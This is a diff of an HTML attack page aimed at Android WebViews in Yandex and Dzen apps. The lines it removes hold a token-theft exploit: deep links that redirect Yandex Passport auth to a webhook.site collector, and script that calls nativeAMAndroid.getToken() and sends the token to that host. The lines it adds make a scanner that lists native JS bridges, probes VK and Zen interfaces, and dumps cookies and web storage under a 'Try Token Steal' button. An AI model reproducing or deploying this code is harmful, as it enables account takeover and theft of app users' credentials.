@@ -1,31 +1,212 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dzen Interface Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #1a1a1a;
+            color: #fff;
+        }
+        h1 { color: #00ff00; }
+        #results {
+            background: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .found { color: #00ff00; }
+        .info { color: #ffff00; }
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            margin: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
 <body>
-    <h2>Critical Exploit: Token Theft</h2>
+    <h1>🔍 Dzen WebView Interface Scanner</h1>
     
-    <a href="ru.yandex.taxi.passport://esia?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">1. Attack via Esia (Wrapped)</a><br><br>
-
-    <a href="plus://ru.yandex.taxi/sbp/redirect?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">2. Attack via Plus SBP (Wrapped)</a><br><br>
-
-    <a href="yandexbank://ru.yandex.taxi/finish-esia?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">3. Attack via Yandex Bank</a><br><br>
+    <button onclick="scanInterfaces()">Scan All Interfaces</button>
+    <button onclick="scanVK()">Test VK Interfaces</button>
+    <button onclick="scanZen()">Test Zen Interfaces</button>
+    <button onclick="tryExploit()">Try Token Steal</button>
+    
+    <div id="results">Нажми кнопку для сканирования...</div>
 
     <script>
-        // Скрипт сработает, если редирект внутри WebView доведет до твоего сайта
-        window.onload = function() {
-            try {
-                var token = nativeAMAndroid.getToken();
-                if(token) {
-                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token=" + token);
-                    alert("Bingo! Token: " + token);
-                }
-            } catch(e) {
-                // Если не получилось, попробуем альтернативное имя
+        var resultsDiv = document.getElementById('results');
+        
+        function log(msg, className) {
+            resultsDiv.innerHTML += '<span class="' + (className || '') + '">' + msg + '</span>\n';
+        }
+        
+        function scanInterfaces() {
+            resultsDiv.innerHTML = '';
+            log('=== SCANNING WINDOW OBJECT ===\n', 'info');
+            
+            var found = [];
+            var patterns = ['VK', 'Zen', 'Android', 'webkit', 'native', 'app', 'bridge', 'JSBridge', 'Yandex', 'dzen'];
+            
+            for (var key in window) {
                 try {
-                    var t2 = Yandex.getToken();
-                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token_alt=" + t2);
-                } catch(err) {}
+                    var lowerKey = key.toLowerCase();
+                    for (var i = 0; i < patterns.length; i++) {
+                        if (lowerKey.indexOf(patterns[i].toLowerCase()) !== -1) {
+                            var type = typeof window[key];
+                            found.push(key + ' : ' + type);
+                            log('✓ ' + key + ' : ' + type, 'found');
+                            
+                            // Если это объект, покажем его методы
+                            if (type === 'object' && window[key] !== null) {
+                                try {
+                                    var methods = Object.keys(window[key]);
+                                    if (methods.length > 0 && methods.length < 20) {
+                                        log('  └─ methods: ' + methods.join(', '), 'info');
+                                    }
+                                } catch(e) {}
+                            }
+                            break;
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            if (found.length === 0) {
+                log('\nNo suspicious interfaces found in window object', '');
+            }
+            
+            log('\n=== TOTAL: ' + found.length + ' interfaces ===', 'info');
+        }
+        
+        function scanVK() {
+            resultsDiv.innerHTML = '';
+            log('=== TESTING VK INTERFACES ===\n', 'info');
+            
+            var vkInterfaces = [
+                'VKWebAppInit',
+                'VKWebAppGetUserInfo', 
+                'VKWebAppGetAuthToken',
+                'VKWebAppGetEmail',
+                'VKWebAppGetPhoneNumber',
+                'VKWebAppGetGeodata',
+                'VKWebAppOpenPayForm',
+                'VKWebAppCallAPIMethod',
+                'VKWebAppStorageGet',
+                'VKWebAppStorageSet'
+            ];
+            
+            // Проверяем VK Bridge
+            if (typeof window.vkBridge !== 'undefined') {
+                log('✓ vkBridge FOUND!', 'found');
+                try {
+                    log('  Methods: ' + Object.keys(window.vkBridge).join(', '), 'info');
+                } catch(e) {}
+            }
+            
+            // Проверяем VKWebAppAPI
+            for (var i = 0; i < vkInterfaces.length; i++) {
+                if (typeof window[vkInterfaces[i]] !== 'undefined') {
+                    log('✓ ' + vkInterfaces[i] + ' FOUND!', 'found');
+                }
+            }
+            
+            // Пробуем вызвать через postMessage
+            log('\n=== TRYING POSTMESSAGE ===', 'info');
+            try {
+                window.postMessage(JSON.stringify({
+                    handler: 'VKWebAppInit',
+                    params: {}
+                }), '*');
+                log('postMessage sent (check console)', '');
+            } catch(e) {
+                log('postMessage error: ' + e, '');
             }
         }
+        
+        function scanZen() {
+            resultsDiv.innerHTML = '';
+            log('=== TESTING ZEN INTERFACES ===\n', 'info');
+            
+            var zenInterfaces = [
+                'ZenKit',
+                'ZenBridge', 
+                'ZenWebApp',
+                'zenNative',
+                'DzenKit',
+                'dzenNative',
+                'AndroidBridge',
+                'NativeBridge'
+            ];
+            
+            for (var i = 0; i < zenInterfaces.length; i++) {
+                if (typeof window[zenInterfaces[i]] !== 'undefined') {
+                    log('✓ ' + zenInterfaces[i] + ' FOUND!', 'found');
+                    try {
+                        var methods = Object.keys(window[zenInterfaces[i]]);
+                        log('  Methods: ' + methods.join(', '), 'info');
+                    } catch(e) {}
+                } else {
+                    log('✗ ' + zenInterfaces[i] + ' not found', '');
+                }
+            }
+            
+            // Проверяем Android WebView interface
+            if (typeof window.Android !== 'undefined') {
+                log('\n✓ Android INTERFACE FOUND!', 'found');
+                try {
+                    var methods = Object.getOwnPropertyNames(window.Android);
+                    log('  Methods: ' + methods.join(', '), 'info');
+                } catch(e) {}
+            }
+        }
+        
+        function tryExploit() {
+            resultsDiv.innerHTML = '';
+            log('=== ATTEMPTING EXPLOITS ===\n', 'info');
+            
+            // Пробуем получить cookies
+            log('Cookies: ' + document.cookie, 'info');
+            
+            // Пробуем localStorage
+            try {
+                log('\nlocalStorage keys: ' + Object.keys(localStorage).join(', '), 'info');
+            } catch(e) {
+                log('localStorage error: ' + e, '');
+            }
+            
+            // Пробуем sessionStorage  
+            try {
+                log('\nsessionStorage keys: ' + Object.keys(sessionStorage).join(', '), 'info');
+            } catch(e) {
+                log('sessionStorage error: ' + e, '');
+            }
+            
+            // Проверяем URL
+            log('\nCurrent URL: ' + window.location.href, 'info');
+            log('Origin: ' + window.location.origin, 'info');
+            
+            // User Agent
+            log('\nUser-Agent: ' + navigator.userAgent, 'info');
+        }
+        
+        // Автозапуск при загрузке
+        window.onload = function() {
+            scanInterfaces();
+        };
     </script>
 </body>
 </html>
